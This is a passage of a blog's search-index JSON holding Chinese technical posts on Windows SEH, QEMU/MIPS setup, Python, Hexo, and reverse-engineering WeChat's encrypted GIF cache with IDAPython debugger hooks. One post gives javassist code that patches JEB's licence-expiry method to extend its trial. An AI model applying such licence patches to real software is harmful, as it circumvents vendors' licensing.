写入地址0，从而引发一个错误     //这句话将不会被执行，因为回调函数返回继续搜索     printf( \"I should never get here!\\n\" );     \\__asm     {        // 移去我们的EXECEPTION_REGISTRATION结构        mov eax,[ESP]            // 获取前一个结构        mov FS:[0], EAX          // 安装前一个结构        add esp, 8               // EXECEPTION_REGISTRATION结构弹出堆栈     } } int main() {     \\__try     {         HomeGrownFrame();     }     __except( EXCEPTION_EXECUTE_HANDLER )     {         printf( \"Caught the exception in main()\\n\" );     }     return 0; }   因为_except_handler函数并没有打算修复出错的代码，因此它返回ExceptionContinueSearch。这导致操作系统继续在EXCEPTION_REGISTRATION结构链表中搜索下一个 EXCEPTION_REGISTRATION结构。接下来安装的异常回调函数是针对main函数中的__try/__except块的。__except块简单地打印出“Caught the exception in main()”。运行这个程序，会发现回调函数调用了2次，第二次是全局展开的原因。   UEF、VEH、VCH异常处理函数定义（UEF和VEH、VCH的函数类型名不一样，但是结构是一样的）：   LONG NTAPI ExceptionHandler(struct \\_EXCEPTION_POINTERS *ExceptionInfo);     关于UEF、VEH、VCH函数的参数。参数只有一个，是指向结构_EXCEPTION_POINTERS的指针。具体结构如下：   typedef struct _EXCEPTION_POINTERS {     PEXCEPTION_RECORD ExceptionRecord;  //异常记录（EXCEPTION_RECORD）的指针     PCONTEXT ContextRecord;             //线程上下文的指针 } EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;   这部分的详细内容就不写了，扯远了。参见参考资料。   关于VC为使用结构化异常处理的函数生成的标准异常堆栈帧如下：scopetable域指向一个scopetable_entry结构数组，而trylevel域实际上是这个数组的索引       EBP-00 _ebp     EBP-04 trylevel     EBP-08 scopetable数组指针     EBP-0C handler函数地址     EBP-10 指向前一个EXCEPTION_REGISTRATION结构     EBP-14 GetExceptionInformation（EXCEPTION_POINTERS）     EBP-18 栈帧中的标准ESP   SCOPETABLE结构中的第二个成员和第三个成员分别是过滤器表达式代码的地址和相应的__except块的地址。 prviousTryLevel用于嵌套的__try块。这里的关键是函数中的每个__try块都有一个相应的SCOPETABLE结构。   typedef struct _SCOPETABLE {    DWORD previousTryLevel;    DWORD lpfnFilter;    DWORD lpfnHandler; } SCOPETABLE, *PSCOPETABLE;   异常处理机制执行顺序   SEH（结构化异常处理，基于线程栈的异常处理） VEH（向量化异常处理，最顶端的异常处理） VCH（同上，最低端 的异常处理 ） UEF（TopLevelEH，顶级异常处理）   异常处理器处理顺序流程：      交给调试器(进程必须被调试)   执行VEH   执行SEH   TopLevelEH(进程被调试时不会被执行)   执行VCH   交给调试器(上面的异常处理都处理不了，就再次交给调试器)   调用异常端口通知csrss.exe   关于SEH和windows下的异常处理就记这么多，已经够多的了，自己也感觉很多东西有点绕。有部分东西没记，更加深入和全面的知识点可以参照以下的链接。   参考链接1 参考链接2 参考链接3 参考链接4 参考链接5  ","categories": [],
        "tags": ["linux","assemble","SEH"],
        "url": "https://zjgcjy.github.io/posts/2018-04/%E9%BB%91%E5%AE%A2%E5%8F%8D%E6%B1%87%E7%BC%96%E6%8F%AD%E7%A7%98%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-3.html",
        "teaser":null},{
        "title": "Jeb2 3 13mips初次破解",
        "excerpt":"     jeb_2.3.13_mips版本初次破解。    前期准备   因为我也没破解过真正的商业软件，也是头一次尝试吧，结合看雪上的资料，对最新的jeb2.3.13_mips版本进行某些功能的破解。首先下载support包，防止bin目录下，运行wincon脚本，自动解压，然后jeb就运行了。我这不是第一次运行了，所以忘了第一次会干什么，好像是填个许可证吧，根据给出的key算个验证码，然后jeb会给40天免费使用时间。之后会弹一个对话框，提示是试用版本，翻译内容如下：   该软件是jeb的限制版本，demo版限制如下：     某些方法限制反编译（Native, Android）     非debug版本应用不支持调试（Android）     不支持多dex合并应用     不允许使用剪贴板     不允许保存项目     任务时间有限     需要网络连接     不允许使用第三方插件   然后jeb会加载插件并检测更新。   patch jar包   这里讲一种方式来patch jar包，通过javassit来实现。javassit也是一个jar包，在官方下载的文件夹里自带了一部分的sample，可以去读一读代码看看各种实现。之后我将给出一些具体的实现方式。   本来都想记一下的，奈何最近比较忙，只展示一个延长许可证时间的demo了。   许可证时间延长   这里的方式就是获取licensing类中的getexpirationtiemstamp方法，然后将方法内容改为return real_license_ts + 345600000;达到延长时间的作用，原理和hook差不多吧。然后打包成jar，在jeb启动前动态加载，hook掉那个方法。达到目的。   import javassist.*; public class Main {     public static void patchLicedsing()     {         try{             ClassPool pool = ClassPool.getDefault();             pool.insertClassPath(\"C:\\\\Users\\\\x\\\\Desktop\\\\patch\\\\jeb.jar\");             CtClass ctClass = pool.get(\"com.pnfsoftware.jeb.client.Licensing\");             ctMethod = ctClass.getDeclaredMethod(\"getExpirationTimestamp\");             ctMethod.setBody(\"return real_license_ts + 345600000;\");             ctClass.writeFile(\"C:\\\\Users\\\\x\\\\Desktop\");         }catch(Exception e){             e.printStackTrace();         }     }     public static void main(String[] args) {         patchLicedsing();     } }   其他就不写了，最近有点忙。   参考资料1 参考资料2  ","categories": [],
        "tags": ["jeb","mips","crackme"],
        "url": "https://zjgcjy.github.io/posts/2018-04/Jeb2-3-13mips%E5%88%9D%E6%AC%A1%E7%A0%B4%E8%A7%A3.html",
        "teaser":null},{
        "title": "Windows下qemu配置",
        "excerpt":"     windows10下qemu虚拟机的安装、启动脚本、网络配置情况。    固件分析利器binwalk   不管以后方向是不是IOT，固件是越来越和re扯上关系了，越学越底层了。心累，装个binwalk备用吧，misc也用得到。因为Kali下自带的binwalk功能不完整，所以从github上获得binwalk以后，按照INSTALL.md里的说明安装。 首先安装依赖项:   # 由于我是win下py2的环境 这个依赖暂时装不了 sudo apt-get install python-lzma pip install nose coverage # 这个我因为是用的anaconda，默认安装 sudo apt-get install python-crypto # 下面的一堆也是andconda带的 sudo apt-get install libqt4-opengl python-opengl python-qt4 python-qt4 -gl python-numpy python-scipy python-pip pip install pyqtgraph # capstone，安装起来很烦的反汇编框架，无论是angr、pwntools还是pwndbg都要装，win下 肯定是安装失败了。 pip install capstone # 还有好多其他依赖项。。   因为我是windows系统，很多东西没法直接装了，有空的话在ubuntu下全装了。最后直接python setup.py install就行了，一般都没什么问题。ps：我发现binwalk是有ida插件的，但是根据更新日期，应该是用的ida6.*的API写的，但是我用的是7.1。由于ida升7之后API重写了，应该没法用，我就没安装。最好是安装所有的binwalk依赖项，这样binwalk在解包固件的时候，才能辨别固件的文件格式（from 唐师傅），万能的e参数解包，哈哈。   安装qemu   具体安装步骤就不说了，毕竟windows，有关linux的安装技巧就百度吧。（手动滑稽）   安装交叉编译环境   这里指的就是安装arm(64)、mips(64)、mipsel(64)、powerpc等等，这些环境的编译环境。（我没用到就没装，以后有空来补这一部分）   qemu系统模式启动   这种模式下，就和VMware安装一个操作系统感觉一样，会运行一个独立的操作系统。例如我们下载mipsel虚拟机，是debain的开发人员上传的虚拟机环境，直接用就好了，虽然有点老了，网址：https://people.debian.org/~aurel32/qemu/mipsel/。 根据网页的文档提示，要下载3个东西，镜像和硬盘（32、64位），用户名是user，密码user。root用户名是root，密码是root。都下载完成之后据要启动了，这是最烦的一步-_-，自己也配置了半天才勉强成功。   # 启动32位mipsel： ..\\..\\qemu-system-mipsel.exe -M malta -kernel .\\vmlinux-3.2.0-4-4kc-malta -hda .\\debian_whee zy_mipsel_standard.qcow2 -append \"root=/dev/sda1 console=ttyS0\" -nographic   这种方式就是普通的虚拟机启动了，具体的参数我这就不说了，可以直接用help命令查看，qemu的参数太多了。 虚拟机是能启动成功的，也没什么其他问题，但是无法和host交互。但是是可以上网的，相当于vmware虚拟机的Net网络模式。   qemu虚拟机网络配置   因为无法和vmware一样设置共享文件夹，所以要和host进行交互的话，我们需要将网络配置进行修改，使用桥接模式来访问外网。 根据网上资料，很多都是linux下的网络配置，在windows下，我使用tap虚拟网卡来进行配置，下载的方式是通过安装openvpn自带的tap驱动（注意：只需要安装tap虚拟网卡驱动就行了，不需要安装该软件）。安装完成后，我们打开网络适配器页面，可以看到多了一个虚拟网卡。      这里我已经将tap网卡的名称改为my-tap了，这是方便之后的使用。这时候tap网卡是默认关闭的，进入tap网卡的属性页面，然后将高级选项栏中Media Status的值改为Always Connection总是连接，这样tap网卡就是默认启动了，但是是没有网络的，因为只是个虚拟的网卡。因为之后要对虚拟机分配ip，此时tap网卡ip是动态分配的，这会导致一些问题，所以改成静态的就行了，网关不用配。      这时候就行了，我们可以启动虚拟机。   # mipsel 32位带网络启动： ..\\..\\qemu-system-mipsel.exe -M malta -kernel .\\vmlinux-3.2.0-4-4kc-malta -hda .\\debian_wheezy_mipsel_standard.qcow2 -append \"root=/dev/sda1 console=ttyS0\" -net nic,macaddr=00:16:3e:00:00:01 -net tap,ifname=my-tap -nographic # mipsel 64位带网络启动： ..\\..\\qemu-system-mips64el.exe -M malta -kernel .\\vmlinux-3.2.0-4-5kc-malta -hda .\\debian_wheezy_mipsel_s tandard.qcow2 -append \"root=/dev/sda1 console=ttyS0\" -net nic,macaddr=00:16:3e:00:00:01 -net tap,ifname=my-tap -nographic   这里的参数也是n多，不详细讲了，和默认启动方式不一样的点在于：-net参数，配置虚拟机的网卡，nic代表创建新的网卡，macaddr指定了虚拟机的mac地址，-net tap代表使用tap网络。意思就是使用host的my-tap虚拟网卡。如果启动虚拟机的时候，看到tap网卡有数据包发送，说明虚拟机正在链接、配置该网卡。 启动完成后，我们还需要手动配置虚拟机的网络。   # 进行ip设置 ifconfig eth0 192.168.5.2 # 设置默认网关（先不设置，若ping主机无反应则设置） route add default gw 192.168.5.1 eth0      这时候，host是可以ping通tap网卡ip和虚拟机ip的，虚拟机可以ping通tap网卡ip，但是ping不通host的ip。此时应该相当于vmware的host only模式，host-only中的主机ip是在适配器里面设置的，而不是连接网络被分配的真实ip地址，如果用虚拟机ping真实ip地址，就相当于ping外网，是ping不通。也就是说在虚拟机来看，tap网卡ip就是host的ip地址，既然可以连接的话，我们就可以用ssh、scp远程来连接到该虚拟机进行文件传送的。 当然这里还有点问题，虚拟机的网络老是会自己掉，即ip又没了。。。这里我搞了很长的时间，一开始以为是防火墙的问题，但是我关了防火墙还是不行，就不知道是为什么了。惊了。      这样基本的网络功能就实现了，但是如上文所说，不能访问外网。。。一些常用的都能用，但是如果要下载软件什么的就很就烦了。所以最后实现host-only模式下虚拟机访问外网。 参考网上的资料，首先我选择的是将tap和已经网卡桥接，通过设置网桥的方式来访问外网，这种方式是可以成功的，但是也遇到很多问题，有可能是防火墙，也有可能是其他问题，总之试了很多次只成功了一次，而且主机的网络会很不稳定，这里不推荐这种方式。 第二种方式就是将已经连上网的网卡设置为共享模式，将my-tap连接到上面，就可以使虚拟机上网。这时候os会提示被共享的ip将设置为192.168.137.1，我们只要将这个值改回来就行了。然后重新启动虚拟机。命令和上面是一样的。一般这时候就可以上网了。 若还是不行，就不要改tap网卡的ip了，直接用192.168.137.1，这时候根据DHCP自动分配ip，这样就终于能上网了。还要注意防火墙的动态，说不定就给拦下来了，用traceroute跟踪下看看。泪崩。。。 最后网络好了之后，用ssh上去看下网络配置吧。            花了一天搭环境，终于给弄好了，好不容易啊，心好累。其实我想上网是有原因的，主要还是为了装gcc和gdb，最后apt-get装完之后，发现gdb调不了mipsel的程序。那我要你有何用。。。卒。      后来发现是要启动gdbserver才行。插一句，在调试非x86架构pwn的时候最好安装好gdb-multyarch并开启gdbserver 。   ","categories": [],
        "tags": ["qemu","mips"],
        "url": "https://zjgcjy.github.io/posts/2018-04/Windows%E4%B8%8Bqemu%E9%85%8D%E7%BD%AE.html",
        "teaser":null},{
        "title": "Python密码学编程笔记",
        "excerpt":"    关于《python密码学编程》的笔记 只列出关键部分，主要学习的和密码学无关系，类似于python的api参考。    分片   关于分片，需要注意的是，分片操作不会在给它的字符串索引太大时报错，它只会返回它能找到的最大匹配。   常量   注意，python中常量变量名是全大写的。   字符串格式化方法   print 'hello %s and %s' % ('df', 'another df')   print 'hello %(first)s and %(second)s' % {'first': 'df', 'second': 'another df'}   print 'hello {first} and {second}'.format(first='df', second='another df')                    格式化符号       说明                       %c       转换成字符（ASCII 码值，或者长度为一的字符串）                 %s       优先用str()函数进行字符串转换                 %d / %i       转成有符号十进制数                 %u       转成无符号十进制数                 %x / %X       转成无符号十六进制数（x / X 代表转换后的十六进制字符的大小写）                 %f / %F       转成浮点数（小数部分自然截断）                 %%       输出% （格式化字符串里面包括百分号，那么必须使用%%）                          格式化操作符辅助符       说明                       *       定义宽度或者小数点精度                 -       用做左对齐                 +       在正数前面显示加号(+)                 #       在八进制数前面显示零(0)，在十六进制前面显示”0x”或者”0X”（取决于用的是”x”还是”X”）                 0       显示的数字前面填充”0”而不是默认的空格                 (var)       映射变量（通常用来处理字段类型的参数）                 m.n       m 是显示的最小总宽度，n 是小数点后的位数（如果可用的话）           num = 100  print \"%d to hex is %x\" %(num, num) print \"%d to hex is %X\" %(num, num) print \"%d to hex is %#x\" %(num, num) print \"%d to hex is %#X\" %(num, num)  # 浮点数 f = 3.1415926 print \"value of f is: %.4f\" %f  # 指定宽度和对齐 students = [{\"name\":\"Wilber\", \"age\":27}, {\"name\":\"Will\", \"age\":28}, {\"name\":\"June\", \"age\":27}] print \"name: %10s, age: %10d\" %(students[0][\"name\"], students[0][\"age\"]) print \"name: %-10s, age: %-10d\" %(students[1][\"name\"], students[1][\"age\"]) print \"name: %*s, age: %0*d\" %(10, students[2][\"name\"], 10, students[2][\"age\"])  # dict参数 for student in students: print \"%(name)s is %(age)d years old\" %student   字符串模板   除了格式化操作符，还可以使用string模块中的字符串模板（Template）对象。使用Template对象的substitute()方法   from string import Template  s = Template(\"Hi, $name! $name is learning $language\") print s.substitute(name=\"Wilber\", language=\"Python\")  d = {\"name\": \"Will\", \"language\": \"C#\"} print s.substitute(d)  # 用$$表示$符号 s = Template(\"This book ($bname) is 17$$\") print s.substitute(bname=\"TCP/IP\")   常用的str类型的内建函数   # 小写 S.lower() # 大写 S.upper() #大小写互换 S.swapcase() # 首字母大写 S.capitalize() # 标题形式，每个单词首字母大写 S.title()  # 输出width个字符，S左对齐，不足部分用fillchar填充，默认的为空格。 S.ljust(width,[fillchar]) # 右对齐 S.rjust(width,[fillchar]) # 中间对齐 S.center(width, [fillchar])  # 返回S中出现substr的第一个字母的标号，如果S中没有substr则返回-1。start和end作用就相当于在S[start:end]中搜索 S.find(substr, [start, [end]]) # 返回S中最后出现的substr的第一个字母的标号，如果S中没有substr则返回-1，也就是说从右边算起的第一次出现的substr的首字母标号 S.rfind(substr, [start, [end]]) # 计算substr在S中出现的次数 S.count(substr, [start, [end]]) #把S中的oldstar替换为newstr，count为替换次数 S.replace(oldstr, newstr, [count])  # 把S中前后chars中有的字符全部去掉，可以理解为把S前后chars替换为None S.strip([chars]) S.lstrip([chars]) S.rstrip([chars])  # 以sep为分隔符，把S分成一个list。maxsplit表示分割的次数。默认的分割符为空白字符 S.split([sep, [maxsplit]]) # 把seq代表的字符串序列，用S连接起来 S.join(seq)  # 判断S是否以substr开头 S.startswith(substr) # 判断S是否以substr结尾 S.endswith(substr)   global 语句   在函数中使用global语句使用全局变量   math模块   # 向上取整 math.ceil(n) # 向下取整 math.floor(n)  # 内建函数，四舍五入进位 round(n)   关于随机数   random.seed()使用该方法定义随机数种子，产生的数是伪随机的，可以通过random.randint()来获取。当要获得真正的随机数字时，可以通过os.urandom()来实现。此外，random.shuffle()可以用来随机打乱列表。   import random random.seed(42) random.randint(1,10) random.shuffle(alist)   引用   变量并不保存列表的值，他们保存的是指向列表值的引用。当把一个列表赋值给另一个变量的时候，实际是把一个列表引用赋值给这个变量。 如果我们希望赋值列表值本身，不是引用值，可以使用copy模块。   import copy spam = [0, 1, 2, 3, 4, 5] cheese = copy.deepcopy(spam)   这样会产生独立的列表变量。或者y = x[:] 通过分片操作将列表x的元素全部拷贝给y，如果简单的把x赋值给y，即y = x，y和x还是指向同一个列表，并没有产生新的副本。   sys.exit()函数   正常情况下，一旦执行到最后，没有更多代码需要执行，我们的程序就会退出，然而，我们可以通过调用sys.exit()函数来让程序提前退出。   os.path.exists()函数   读取文件的时候，我们可以通过调用该函数来判断文件是否存在。当不存在的时候，手动退出即可。   包装器函数   def encryptMessaege(key, message):     return translateMessage(key, message, 'encrypt')  def decryptMessage(key, message):     return translateMessage(key, message, 'decrypt')  def translateMessage(key, message, mode):     pass   pprint模块   用于美化输出   import pprint pprint.pprint(list) # 转字符串 printlist=pprint.pformat(list)   re模块   re是正则表达式模块，用于字符串匹配。re.compile('[^A-Z\\s]')表示匹配所有不是A-Z范围内同时也不是空白字符的字符。这个对象有个sub()方法，类似于replace()方法。第一个参数是字符串，用于替换第二个参数中这个模式的任何匹配实例。   值传递函数   str.sort(key=ETAOIN.find, reverse=True)   这里的find不是调用find()方法，而是把find方法作为一个值传给sort方法调用。   def doMath(func):     return func(10, 5) def adding(a, b):     return a+b def subing(a, b):     return a-b # 调用加法，输出15 doMath(adding) # 调用减法，输出5 doMath(subing)   sorted()用法   sorted(iterable[, cmp[, key[, reverse]]])该方法对所有可迭代序列都有效。默认是升序排列。 使用cmp函数排序，cmp是带两个参数的比较函数   list1 = [('david', 90), ('mary',90), ('sara',80),('lily',95)] # 按照第一个位置的字母序排序 print sorted(list1,cmp = lambda x,y: cmp(x[0],y[0])) # [('david', 90), ('lily', 95), ('mary', 90), ('sara', 80)]  # 按照第二个位置的数字序排序 print sorted(list1,cmp = lambda x,y: cmp(x[1],y[1])) # [('sara', 80), ('david', 90), ('mary', 90), ('lily', 95)]   添加key参数，key 是带一个参数的函数，此函数将在每个元素比较前被调用。   print sorted(\"This is a test string from Andrew\".split(), key=str.lower) # 输出为：['a', 'Andrew', 'from', 'is', 'string', 'test', 'This']   字典转列表   如果要获得字典里的所有键，通过key()方法会返回dict_keys对象，传给list()即可获得列表。 如果要获取所有的键对于的值，通过values()方法即可，会返回一个dict_values对象，同样传给list()即可。 如果要获得字典中所有的键值对，可以通过items()方法，返回的dict_items对象传给list()，将会返回元组列表，每个元组包含一个键值对。   extend()方法   extend()列表方法和append()很像，不过，前者是把一个列表的每项添加到这个列表的末尾，后者是将单个值添加到列表末尾。   spam = ['cat', 'dog', 'mouse'] spam.extend([1, 2, 3]) print spam # spam = ['cat', 'dog', 'mouse', 1, 2, 3]   itertools模块   关于itertools.product()函数的作用是，生成列表或者类列表值，返回生成器对象。爆破常用。 python密码学编程笔记  import itertools itertools.product('chen', repeat = 4) &lt;itertools.product object at 0x0000000002980A68&gt; list(a) # 将输出a  ","categories": [],
        "tags": ["python2"],
        "url": "https://zjgcjy.github.io/posts/2018-08/python%E5%AF%86%E7%A0%81%E5%AD%A6%E7%BC%96%E7%A8%8B%E7%AC%94%E8%AE%B0.html",
        "teaser":null},{
        "title": "Hexo Using",
        "excerpt":"     使用github+hexo+themes搭建简易个性主题博客    install Node.js   不用多说，官网或者github上安装就行了。   install Hexo   开始使用 Hexo   e.g: 在D盘新建一个hexo文件夹,进入该目录  $ cd d:/hexo   初始化 Hexo   $ npm install hexo-cli -g $ hexo init blog $ cd blog $ npm install $ hexo g # 或者hexo generate $ hexo s # 或者hexo server，本地查看，默认位置：http://localhost:4000/   另外还有其他几个常用命令   $ hexo generate (hexo g) 生成静态文件，会在当前目录下生成一个新的叫做public的文件夹 $ hexo server (hexo s) 启动本地web服务，用于博客的预览，默认端口为4000 $ hexo deploy (hexo d) 部署播客到远端（比如github, heroku等平台） $ hexo new \"postName\" (hexo n \"postName\") #新建文章 $ hexo new page \"pageName\" \t #新建页面   常用简写   $ hexo n == hexo new $ hexo g == hexo generate $ hexo s == hexo server $ hexo d == hexo deploy $ hexo d -g #生成部署 $ hexo s -g #生成预览   关于草稿   使用hexo new draft &lt;filename&gt;生成新的草稿，相当于私密文件了，无法在远程访问，如果你希望强行预览草稿，更改配置文件如下：render_drafts: true，最后，可以把草稿再发布出去：hexo publish [layout] &lt;filename&gt;   Hexo主题设置   安装主题   $ hexo clean $ git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia   启用主题   修改Hexo目录下的_config.yml配置文件中的theme属性，将其设置为yilia。   更新主题   $ hexo clean $ hexo g # 生成 $ hexo s # 启动本地web服务器   更新主题   首先安装一个扩展   $ npm install hexo-deployer-git --save   需要在配置文件_config.xml中作如下修改：   deploy:   type: git   repo: git@github.com:xxx/xxx.github.io.git   branch: master   然后在命令行中执行 hexo d   关于域名   $ cd source/ $ touch CNAME $ vim CNAME # 输入你的域名  ","categories": [],
        "tags": ["hexo"],
        "url": "https://zjgcjy.github.io/posts/2018-08/hexo-using.html",
        "teaser":null},{
        "title": "Idapython实现dump微信gif表情包",
        "excerpt":"   最近一周都没课了。emm，闲来无事想从微信上下一波表情包。然而微信在我不知不觉中更新了。以前的套路没法用了，于是自己就花时间研究了一下。特记此文。 使用的工具主要是IDA，分析的对象是PC新版微信客户端，目标是获取GIF动图。 ps:我这指的GIF是指微信表情商店里的表情（只能发送给别人，没办法保存到本地）    老版微信如何保存GIF   做这件事情的起因就是发现我PC上的微信自己更新了，那么就先安利一下老版本如何截取GIF图片。我使用的是PC版的微信客户端，有关Android版的不在讨论范围内。   首先我们找到PC版的用户配置文件夹。一般在文档文件夹下，以微信id表示账号。如下图所示。      其中的CustomEmotions就是老版本微信缓存的GIF位置，当我们登陆PC版微信，然后用手机给别人发图的时候。消息同会同步到PC上，其中的GIF图片被处理后保存到这个文件夹内。具体是怎样处理的我也忘了，好像就是改GIF文件头部，其他没有变化。这样我们就能得到GIF了。   新版微信对GIF缓存做了什么处理   但是微信更新后，此时CustomEmotions文件夹内不会保存任何东西，甚至删除该文件夹也不会影响微信接受消息。这时所有的GIF被保存到CustomEmoV1文件夹内，而且均被加密处理。为了演示效果，我首先将该文件夹清空，然后用手机给别人发图（手动滑稽），效果如下图所示。      此时PC上同步显示图片，同时GIF被保存到CustomEmoV1文件夹内，如下图所示。      很明显，一张GIF对于一个文件，文件名32位长，可能是MD5。然后我们选择一个文件打开。      可以看到文件头被修改成V1MMWX，WX肯定指的就是微信了，V1MM不知道是什么，应该是微信开发人员定义的格式。不仅如此，熟悉GIF格式的童鞋也不难发现，除了文件头，下面的内容也被加密了。   下面我就讲一下我是怎么分析这个文件的。   如何分析加密数据   首先看一下文件的大小是否发生变化。这里我要解释一下的是，我以前曾经从老版的微信上获取过GIF，这些GIF我都保存了，所以可以直接用该GIF和加密后的GIF进行对比，就不截图了。对比的结果是：加密后的大小比加密前的大小多7字节。   如何看待这7个字节      我认为其中有6个字节是V1MMWX这个文件头造成的影响。   对100KB左右的文件来说，加密是需要时间的，但是微信是即时通讯工具，开发人员应该不会使用复杂的加密算法。   整体上来说，加密前后数据量大小是一致的。   基于以上三点，我猜测就是一个简单的亦或加密。然后我用python的xortool分析了一下该文件。      然后自动分析出极大可能解，这里它给出了一个key是0x2b(‘+’)。      最后我将得到的文件和原始文件比对。      惊人的发现！除了前0x3ff字节不一样，后面的字节都是一样的，也就是说，加密的方式其中之一就是亦或。具体就是对文件从0x400开始的字节亦或0x2b。   到现在为止，我已经知道了文件后面一部分的加密方式，如何解密前面一部分呢？我认为还是要抓住V1MM这个文件头，因为这个头是开发人员固定的，那么这个值应该是个明文，或者说是应该是某个exe或者dll中.rdata段的（我只能期望它不是SMC之类动态生成的了）于是我就去微信安装目录下找这个字符串在哪。 结合exe和dll的名称、以及更新日期，我很幸运的找到了。      找到之后很显然要干什么了。开IDA吧。   开始分析WeChatWin.dll   由于这个dll相当的大，IDA分析了很久才完，我也是第二次分析这么大的东西（第一次是某CTF的tensorflow），话不多说，直接shift+f12找V1MM字符串的位置。然后我就惊了，ida没找到，估计是类型不对吧。无奈，只好手工定位了。第一次失败了，忘了是FOA了，要转成RVA。算了，直接定位到.rdata基址，直接用偏移，终于发现了V1MM的位置。      然后就交叉引用，发现有三处，其中2处由同一个函数引用（另外一处应该是CRT或者编译器函数）进入这个函数分析。直接f5后，能发现关键的几行代码，如下图所示。      这几行就是GIF加密后保存的地方了，首先将6字节的V1MMMX复制到cipher指针指向的首地址，然后是2个move函数，也可以理解是memcpy。而且第一个是从cipher指针指向首地址向后移动6字节开始的，那肯定就是上文中未解密的部分了。第二个move又是从第一个move结束的地方开始的，那就是上文提到的异或算法了。   由于这段是最后部分，加密都处理完了，我们需要往上看，同时整体把握这个函数的作用。      可以发现，该函数应该是一个BOOL类型的函数，若处理成功则返回1，否则返回0。还能发现的是，cipher虽然是个局部变量，但在函数第一行可以发现它被指向了该函数的第二个参数，考虑到是BOOL类型的函数，函数只能返回一个值，那么对这个处理的函数而言，只有可能将文件句柄作为参数传入，修改后才能有效。也就是说该函数的第一个参数应该是文件句柄，而指向加密内容的第二个参数应该是加密后的指针所指向的地方。 还有一些地方指的思考，比如a1[1]这个地方的值是什么。   if (a1[1] &lt; 0) {   return 0; }   在函数一开始，就比较a1[1]这个地方的值，小于0则直接返回，我猜测是是文件大小的意思。后面的代码直接验证了我的猜想。      看到了熟悉的0x3ff，上文已经提到了，加密的GIF前面0x3ff的加密方式还是未知的，这里直接比较a1[1]和0x3ff的大小，其实就是判断GIF的大小，如果比0x3ff小，那么v7变量就不能想0x3ff，而是文件的大小。也就是说如果GIF本身大小不超过0x3ff，就不会使用第二部分的异或加密。   struct a {     int* file;     int size; }   分析完这部分，我们可以将该函数的第一个参数转换成结构体，第一个值是文件内容指针，第二个值是文件的大小。关于这个值怎么得到并传入该函数的，不是我们分析的重点。      回过头来再看最后一部分传入的第二个参数，其实我们就能分别找到那2个加密的函数。其中绿色框中的2个函数就是加密的2个函数。 我们先看第二个函数，也就是异或那个。   第二段加密-异或      进入这个函数就能看到，很明显的取了一个byte(0x2b)，然后循环异或，具体的过程我就不分析了，只是验证一下，因为最开始的时候我已经用xortool自动分析出来了。有兴趣的可以分析一下，或者动态调试一下看看是怎么加密的。   第一段加密-rsa   这个第一段加密很复杂，emm看着就不想分析了，看见一串明文crypto\\\\rsa\\\\rsa_lib.c更是让我感到绝望。         哇，是真的绝望。。。 然后就没有然后了，我是没有分析下去。应该是解密不了的。毕竟输出的是一个缓存文件，如果要分析微信是否能读取GIF缓存，或者说读取的格式是怎样的，我的功力还不够。。。（我要弃坑，我要转web） 讲道理，上面的路已经不通了，下面开始想想别的方法。   如何获取GIF   其实方法我刚刚已经提示了，因为这个函数接受的参数就是完整的GIF，这个结构体上面也解释了，只要获取这个结构体就能拿到完整的GIF。因此，我们返回到原来那个函数的入口点，看什么时候结构体参数被引用。      显然就是这里了，在将参数传给edi后，后面就判断结构体的第二个属性，即文件长度是否大于0。如果我们能在dll每次运行到这里的时候获取这两个数据，然后dump指定内存，就能拖出这个GIF图，也就不需要解密了。然后我动态调试了很多次，幸运的是并没有触发什么反调试和异常，使用的方式是idapython，首先是手动加载。   location = GetRegValue('edi') sizeptr = GetRegValue('edi') + 0x4 start = Dword(location) n = Dword(sizeptr) f = open(os.path.join(savepath, str(count)) + '.gif', 'wb') for i in xrange(n):     f.write(chr(Byte(start + i))) f.close()   然后每次都发个图给别人，PC就会缓存，然后GIF就会被保存下来了。如果每次都是手动加载的话，我记得这段代码是没问题的。但是不想每次都由我自己来下断点然后dump，为了实现自动化，自己也是学习了一波idapython来自定义Debugger Hook。   idapython的Debugger Hooks   主要用于Hook IDA 内部的调试器，同时可以自定义调试功能。结构如下   class DbgHook(DBG_Hooks):     def dbg_process_start(self, pid, tid, ea, name, base, size):         return     def dbg_process_exit(self, pid, tid, ea, code):         return     def dbg_library_load(self, pid, tid, ea, name, base, size):         return     def dbg_bpt(self, tid, ea):         return   安装hook的方式如下   debugger = DbgHook() debugger.hook()   一开始我是在dbg_process_start来自动插入断点的，但是后来发现效果并不会，这一点我之后会说明。   我通过定义了MyDbgHook来继承DBG_Hooks，再次载入上面的脚本运行，结果却是这样的。      文件里写的都是0xff。除了这种情况还会发生发送多个图片，获取的GIF均是同一个的离奇事件。查了半天不知道哪里出了原因。最后翻idapython的资料，最后发现是api使用不当，但是具体是为什么也没有资料，感觉Dword(ea)和DbgDword(ea)之类的都差不多，可能一个前面有dbg所以是dbg专用的吗。 更新后的脚本。   location = GetRegValue('edi') sizeptr = GetRegValue('edi') + 0x4 start = DbgDword(location) n = DbgDword(sizeptr) f = open(os.path.join(savepath, str(count))+'.gif','wb') for i in xrange(n): \tf.write(chr(Byte(start+i))) f.close()   运行结果如下图。      更新后，效果好了很多，但是还是有问题，有的能显示，有的GIF显示不了，于是又查了一波idapython资料，最后发现还是api使用不当。。。Byte(ea)、DbgByte(ea)还有DbgRead(ea,n)，其实功能都是一样的，可能是Dbg的方式影响了某些API的实现，导致出现了很多问题。 再次更新脚本。   location = GetRegValue('edi') sizeptr = GetRegValue('edi') + 0x4 print \"[*]\\tGif location:[%08x],sizeptr:[%08x]\"% (location, sizeptr) start = DbgDword(location) n = DbgDword(sizeptr) print \"[*]\\tGif start:[%08x],n:[%08x]\"% (start, n) dump = DbgRead(start,n) f = open(os.path.join(self.savepath, str(self.count))+'.gif','wb') f.write(dump) f.close() self.count += 1   ida日志输出如下图。      运行结果如下图。      完整代码及说明   代码的几点说明：      dbg_process_start是最先加载的，在这里下断点会导致问题。   Modules()用于遍历整个环境中的模块，一开始我是想通过这个下断点的，后来发现DBG_Hooks已经提供了类似的函数，就是dbg_library_load，由于我的目标是WeChatWin.dll，当其加载的时候下断点就行了。   下断点的方式是通过偏移量来实现的，考虑到ASLR或者其他不可抗因素，直接VA下断不可行，通过模块BA+0x1000+offsite来实现，0x1000就是.text的VirtualAddress，详细可以参照PE中的节表。   Dbg模式下请使用ida python对应的API，否则如上文所述会导致未知情况。如将Dword(ea)替换成DbgDword(ea)。   # coding:utf-8 __author__='zjgcjy'  from idaapi import * from idautils import * from idc import * import os  # 没用到，效果不好，或者说dbg_library_load更方便 def 